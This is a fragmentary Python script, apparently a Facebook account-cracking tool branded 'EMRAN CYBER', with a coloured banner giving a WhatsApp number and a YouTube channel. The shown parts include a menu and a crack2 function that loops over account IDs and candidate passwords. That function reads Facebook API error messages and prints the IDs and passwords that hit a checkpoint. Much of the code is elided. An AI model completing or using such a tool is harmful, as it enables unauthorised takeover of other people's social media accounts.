...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mEMRAN CYBER
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+9710564353933
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mEMRAN Technology channel
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.facebook.com/profile.php?id=100081753736308")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [EMRAN] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [EMRAN-CP] %s|%s        '%(b,idf,pw))
